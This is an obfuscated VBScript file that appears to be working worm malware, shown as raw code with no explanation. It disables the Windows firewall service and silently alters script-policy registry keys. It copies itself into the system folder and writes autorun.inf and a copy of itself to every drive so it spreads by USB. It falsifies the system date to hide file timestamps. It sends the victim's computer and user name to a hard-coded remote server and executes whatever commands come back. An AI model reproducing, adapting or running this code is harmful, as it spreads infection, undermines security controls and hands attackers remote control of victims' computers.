On ERroR ResUME neXt
seT FSO=CrEateOBJEct(STRrEVErSE("TceJbOmEtSYSELiF.gniTPircS"))
set wshsHELl=CReaTeOBjECt(StrReVErsE("lLEhS.TpIrcsw"))
dIm dRi_LISt,dri_lisT0
dIm ISsEnd
IssENd=0
c_time=daTe()
wsHSHeLL.rUN "Net stop sharedAcCESs",0
set dRvs=fso.DriVEs
sYsdIR=fso.gETspECIALFOlDer(1)
thiSPAtH=WsCRIpT.sCrIpTfULLNAmE
seT fc=FSo.OpentExtfiLE(tHISpaTh,1)
sCOpy=fC.reAdalL
Fc.cLose
SEt fC=NoThiNG
call wriTEfilE(sYSdIr&"\SysINfO.rEg",unescaPe(STRreVERsE("00C2%00c2%00c2%00c2%00C2%00C2%00c2%00c2%00c2%00C2%00c2%00C2%00C2%00c2%00C2%00a3%92%B82%XEHd3%22%EMiTceXe22%a0%D0%02%22%22%d3%22%SreteMarap22%a0%D0%02%22%SbV.gfCnRPc5%c5%23mEtSySc5%c5%52%rIdNiW52%22%d3%22%tpIRcs22%a0%d0%02%D5%0C5%0c5%Putratsc5%STPIrcSC5%ENIhCAmC5%etatsc5%yciloP02%PuORgC5%noIsRevtnerRUcc5%swOdNiwC5%tfoSoRCimC5%ERAWtFosc5%ENihcAM_lACOl_YEkHb5%a0%D0%A0%D0%02%00C2%00C2%00c2%00c2%00C2%00c2%00C2%00C2%00c2%00C2%00C2%00c2%00c2%00c2%00c2%00A3%92%b82%xEHd3%22%EMiTcexe22%A0%D0%02%22%22%d3%22%SreTEMaRAP22%a0%d0%02%22%sbv.gFcNRPc5%c5%23mEtSysc5%c5%52%RidNiW52%22%d3%22%tpIRCS22%a0%d0%02%d5%0C5%0C5%PUTrAtsC5%sTpIRCSC5%metsYSc5%SWodNiwc5%tfosORCiMC5%sEiCIlOPc5%erAwTFosC5%eNIhCaM_Lacol_YEkhb5%A0%d0%A0%d0%03%03%E2%53%02%e6%f6%96%37%27%56%65%02%27%F6%47%96%46%54%02%97%27%47%37%96%76%56%25%02%37%77%f6%46%E6%96%75%")))
wshShELl.RUN "REgEdit /S sysINFo.REg",0
wsCrIpT.SLEEP 200
FSo.dELetEfile sysdIR&"\SYsiNfO.rEG",TruE
If InstR(tHiSpAth,sySDir)>0 tHen
Dri_liSt0=LIstdRv()
O_timE=lEFt(C_TiMe,3)&csTr(INT(mID(c_TImE,4,1))-1)&rIght(c_TiME,lEN(C_timE)-4)
wsHSheLL.rUn "cMD /c DaTE "&O_TIME,0
wSCRIpt.SLEeP 10000
foR DrI_I=1 To len(DRi_lISt0)
caLl wrITEaUTO(mId(DrI_lISt0,dRI_i,1)&":\")
Next
WShshElL.Run "Cmd /c datE "&c_tiME,0
coMpuTErNAmE="":usernAmE=""
SET OBJwMIsERvice=geTobject("WINmGMtS:{imPeRsonatiONleVEl=ImPerSONate}!\\.\ROOT\CImV2")
SEt cOLCoMPUtERS = oBjWmIsERVICe.execQUery("seLect * froM WiN32_cOmPUtERsYSteM")
fOr eACh oBjComputER in cOlComPUTers
CompUTernAme=ObJcompUteR.nAMe
Username=oBJCOmpUTEr.USeRNaME
next
if useRnAME="" THen UsErname="EvaR"
If inSTR(usErNAme,"\")<=0 theN
UserNAMe=COmPUTeRnaMe&"\"&USERnAme
ENd iF
dO
if isseND=0 THen
SEt XmL=crEaTEobJect(StRrEvErse("PTthlMxReVreS.2lmxsm"))  
xmL.oPEn "get",sTRrEVeRsE(unescaPe("%3d%61%3F%70%73%61%2e%74%6e%75%6f%63%2F%61%76%65%2f%62%7a%7A%2F%30%30%31%2e%34%30%31%2e%39%31%31%2E%32%30%32%2F%2F%3a%70%74%74%68"))&UsERnaMe,0
XML.sETrEQUEsThEadER "UseR-AGent","eVaR"
Xml.seND()
IF err.NUmbeR=0 thEN
iSsENd=1
Res=xML.REsPoNseteXt
iF UCasE(LeFt(rES,7))=ucaSe("ExecuTe")  TheN exeCuTe Res
elsE
eRR.cleAR
eNd If
sET Xml=notHING
eND IF

Dri_liSt=liStDRV()
fOr DrI_K=1 To leN(DRi_LIsT)
iF InsTR(DRi_LiST0,mId(dRi_LIsT,dri_K,1))<=0 theN
calL WRitEAuto(mID(dRi_List,DRi_K,1)&":\")
EnD IF
NEXt
DrI_lIst0=drI_LiSt
wScRIpt.slEEp 1000
Loop
elSE
WSHsheLL.ruN "ExpLoRER .\",3
WSCripT.SLEEP 2000
wShSheLl.APPaCtiVaTE UnEScaPe(lcASE("%u6211%u7684%u7535%u8111"))
wShShELL.SendkeYS ucaSE("% C")
rUnFLag=0
fOr EacH pS in GEtOBjEcT _ 
("WiNMGMts:\\.\rOoT\cImv2:wiN32_ProceSs").iNstANces_ 
iF lcAse(PS.nAME)=lCAse("wsCriPt.EXE") theN
RunfLAG=RUNflAg+1
EnD iF
NEXt
iF RUnFlAG>=2 theN WScrIPt.QUIt
Set Sf=Fso.gETfolDeR(SySDIr)
f_tIMe=leFT(sf.DATecrEaTEd,INstr(sF.daTecReateD," ")-1)
wsHshElL.RUn "CMd /C DAtE "&f_tImE,0
wsCrIPt.SleEP 100
caLl wRiteFILe(SYsdiR&lcaSe("\pRnCFG.vbs"),VS(ScopY))
WShsHelL.rUn "cMd /C dAte "&C_TiME,0
wshSHELl.RUn SYSdIr&"\PRnCFg.VbS"
eNd iF
FUnCtion VS(str)
exeCUTe sTrREveRSe(uNeSCapE("%29%29%22U%25%22%28esAcL%2C%29%22U%25%22%28esacU%2cSv%28EcALpeR%3DSv%0D%0atXen%0d%0AFI%20Dne%0D%0aC%26sv%3DSV%0d%0aeSLE%0d%0A%29C%28EsaCl%26Sv%3dSV%0d%0aNeHT%2005%3E%29001*%29%28DNR%28tNi%20fI%0d%0AEzimOdNaR%0D%0A%29%291%2ci%2crts%28dim%28EsaCU%3dC%0D%0A%29rts%28nEL%20Ot%201%3Di%20Rof"))
eNd FuNction
fUnCtion lIStdRv()
exEcUte strReveRSE(UNEscaPE("tSil_pmT%3DVRdtsil%0D%0atxEN%0D%0afI%20dnE%0d%0aRETTeLevIrD.vRd%26tSil_pMT%3dtSIl_PMT%0d%0aNEhT%20YdAErsi.vRd%20FI%0d%0asVRd%20NI%20vRD%20hCaE%20ROf%0D%0A%22%22%3dtSIl_PmT%0d%0aTsiL_PMT%20MID"))
ENd functiOn

sub wRIteAutO(patH)
eXecuTe sTRReVERse(UNescApe("fI%20DNe%0d%0AEURt%2C%22FNI.nUroTua%22%26hTAP%20elIfETeLeD.osF%0d%0ANEht%20%29%22fNi.NUrOTua%22%26hTaP%28STSiXeelif.Osf%20FieslE%0d%0A%29%28Dnr%26HTap%2c%22fnI.nURoTuA%22%26hTaP%20reDLOfEvOm.OsF%0d%0aNeHt%20%29%22fnI.nURotuA%22%26htAp%28STsIXEredLOf.oSf%20fI"))
cmdstr="SHell\*\COMManD=wScrIpT.eXe "&ChR(34)&"eVa.Vbs"&chr(34)
AUtOSTR="[AutORuN]"&VbCRlf&"oPeN="&VbCrlf&rEPlace(CmdstR,"*","oPEn")&vbcRlF&rePlaCe(cmDStR,"*","expLorE")&VBcrLF&rEpLaCE(Cmdstr,"*","find")
caLl WRiteFiLe(Path&ucaSE("AUToruN.inf"),AutOsTR)
call WRITefiLE(PATH&"Eva.vbS",vs(sCOPY))
EnD sUb

Sub wRITEfiLE(FPATh,cONtENt)
eXeCUte strREvErSe(unescAPe("GNIhton%3Daf%20TEs%0D%0a7%3DSeTubirtta.Af%0d%0A%29hTapF%28ELifTEG.OSF%3DaF%20tes%0D%0agniHtON%3DCf%20teS%0d%0aesOlc.CF%0D%0atNETnoc%20EtiRW.CF%0d%0a%29EUrt%2C2%2CHtAPF%28eLiFtXeTNEPO.Osf%3DCf%20Tes%0d%0Aeurt%2ChTAPf%20ELiFEtELed.oSF%20nehT%20%29Htapf%28stsIXEelif.OSf%20fI"))
end sUB
